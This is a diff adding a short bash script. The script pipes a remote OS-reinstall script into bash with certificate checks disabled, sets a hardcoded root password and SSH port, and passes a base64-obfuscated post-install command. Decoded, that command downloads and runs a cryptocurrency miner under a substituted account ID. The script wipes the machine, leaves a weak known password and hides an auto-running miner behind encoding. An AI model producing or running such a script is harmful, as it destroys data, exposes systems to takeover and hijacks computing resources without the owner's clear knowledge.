@@ -1,0 +1,3 @@
+#!/bin/bash
+
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "NP.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKYXB0IC1xcXkgaW5zdGFsbCB3Z2V0CndnZXQgLVAgL3Jvb3QgaHR0cHM6Ly9naXRodWIuY29tL2Fwb29sLWlvL2Fwb29sbWluZXIvcmVsZWFzZXMvZG93bmxvYWQvdjEuNi4xMC9hcG9vbG1pbmVyX2xpbnV4X3YxLjYuMTAudGFyCnRhciAteGYgL3Jvb3QvYXBvb2xtaW5lcl9saW51eF92MS42LjEwLnRhciAtQyAvcm9vdApzZWQgLWkgJ3MvQ1BfMzJoYjg2bnZ4Yy9DUF9lZmwyOTJucHV4L2cnIC9yb290L3J1bl9xdWJpY19jcHUuc2gKY2QgL3Jvb3QKLi9ydW5fcXViaWNfY3B1LnNoCg=="
